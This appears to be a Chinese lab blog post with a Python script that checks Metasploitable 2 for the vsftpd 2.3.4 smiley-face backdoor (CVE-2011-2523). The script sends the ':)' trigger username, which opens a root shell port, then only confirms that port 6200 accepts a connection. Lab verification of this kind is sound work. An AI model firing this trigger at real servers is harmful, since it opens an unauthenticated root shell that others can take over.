---
title: 笑脸漏洞检测 PoC
date: 2026-11-01 14:20:00
categories: [网络渗透]
tags: [vsftpd, CVE-2011-2523, Python, Metasploitable2, 渗透测试]
description: 在 Metasploitable 2 靶机上用 Python 脚本检测 vsftpd 2.3.4 笑脸后门（CVE-2011-2523）——读 banner 判版本、发 :) 用户名触发、只看 6200 是否开放，全程不向靶机写入任何命令。
---

## 什么是"笑脸漏洞"

vsftpd 2.3.4 的源码包曾经被攻击者替换过，在里面植入了后门：只要 FTP 登录时**用户名以 `:)` 结尾**，服务端就会在 **6200 端口** fork 出一个绑定 root 权限的 shell，而且完全跳过密码校验。

因为触发条件是那个笑脸符号，圈内习惯叫它"笑脸漏洞"，编号 **CVE-2011-2523**。Metasploitable 2 靶机 21 端口跑的正是这个版本，是入门渗透的经典练习目标。

<!-- more -->

## 环境

| 角色 | 系统 | IP |
|------|------|-----|
| 攻击机 | Kali Linux | 192.168.220.128 |
| 靶机 | Metasploitable 2 | 192.168.220.132 |

两台虚拟机都挂在 VMware 的 **VMnet8（NAT）** 下，处在同一个 `192.168.220.0/24` 网段，可以互相访问。

## 检测思路

整个检测只做三件事，全程不碰靶机的命令行：

1. 读 21 端口的 banner，判断是不是 `vsftpd 2.3.4`
2. 发一个以 `:)` 结尾的用户名，让后门自己把 6200 端口打开
3. **只看 6200 能不能建立 TCP 连接**，能连上就说明后门存在

第 3 步连上之后立刻关闭，不发送任何命令——这是"验证漏洞"和"实际入侵"之间的分界线。

## 第一步：确认网络可达

![ping 靶机](/img/vsftpd-poc-01.png)

先 `ping -c 2` 确认两台机器通不通。这里 2 个包全收到、0% 丢包、延迟 0.4ms 左右，说明靶机在线且在同一网段。如果这一步就失败，后面的检测没有任何意义，得先检查虚拟机的网络适配器是不是都选了 VMnet8。

## 第二步：把检测脚本写进 Kali

![heredoc 写入脚本](/img/vsftpd-poc-02.png)

用 `cat > 文件 << 'PYEOF'` 的 heredoc 方式一次粘贴成文件。命令行里出现的 `heredoc>` 是 shell 的续行提示符，表示"还在等输入"，不是报错。脚本贴完后单独顶格写一行 `PYEOF`，文件就保存好了，不需要提前用 touch 或 vim 建空文件。

## 第三步：执行检测

![检测结果](/img/vsftpd-poc-03.png)

结果一目了然：banner 返回 `220 (vsFTPd 2.3.4)`，版本命中；随后 6200 端口可以建立连接，判定**存在笑脸后门**。

## 完整脚本

```python
import socket, time, sys

def recv(s, t=5):
    s.settimeout(t)
    b = b""
    try:
        while b"\n" not in b:
            c = s.recv(1024)
            if not c:
                break
            b += c
    except socket.timeout:
        pass
    return b.decode("latin-1", "replace").strip()

def check(ip):
    # 1) 版本探测
    with socket.create_connection((ip, 21), timeout=5) as s:
        ban = recv(s)
    print("[*] banner: " + ban)
    if "vsftpd 2.3.4" not in ban.lower():
        print("[安全] 版本不匹配")
        return False

    # 2) 用 :) 触发后门
    with socket.create_connection((ip, 21), timeout=5) as s:
        recv(s)
        s.sendall(b"USER x:)\r\n")
        recv(s)
        s.sendall(b"PASS x\r\n")
        recv(s)
    time.sleep(2)

    # 3) 只验证端口状态，不发任何命令
    try:
        with socket.create_connection((ip, 6200), timeout=5):
            pass
        print("[高危] 6200 开放 -> 存在笑脸后门")
        return True
    except OSError:
        print("[可疑] 2.3.4 但 6200 不通")
        return False

if len(sys.argv) != 2:
    sys.exit("用法: python3 " + sys.argv[0] + " <靶机IP>")
check(sys.argv[1])
```

用法：

```bash
python3 ~/vsftpd_check.py 192.168.220.132
```

纯标准库实现，Kali 自带 Python 3，不需要 pip 装任何东西。

## 结果怎么解读

| 输出 | 含义 |
|------|------|
| `[安全] 版本不匹配` | banner 不是 2.3.4，该后门不存在 |
| `[高危] 6200 开放 -> 存在笑脸后门` | 版本命中且后门端口开放，确认存在 |
| `[可疑] 2.3.4 但 6200 不通` | 有些发行版重打包时修了洞但没改版本号，也可能是 6200 被防火墙拦了 |

## 两个踩过的坑

**banner 大小写。** 实际返回的是 `vsFTPd 2.3.4`，其中 `FTP` 是大写。如果直接用 `"vsftpd 2.3.4" in banner` 精确匹配，会被判成"安全"而漏报。改成 `.lower()` 之后再比较才对。

**零宽字符。** 脚本里如果写了 `if __name__ == "__main__":`，从网页复制到终端时有概率被插入不可见的零宽空格（U+200B），变成 `"__8#8203;main__"`。条件永远不成立，脚本定义完函数就直接退出，一个字都不输出，非常难查。现在这版干脆不写 `__main__` 守卫，直接从源头规避。

## 边界声明

脚本只做 `connect()` 然后立刻断开，**没有向 6200 写入任何字节**，也没有执行任何命令。所有测试均在本地搭建的 Metasploitable 2 靶机上进行。

另外注意：6200 在触发后会一直开着，**重启靶机即可关闭**。Metasploitable 2 是官方提供的漏洞靶机，但它本身非常脆弱，务必只放在 NAT 或 Host-only 网络里，绝不要桥接到公网或校园网。
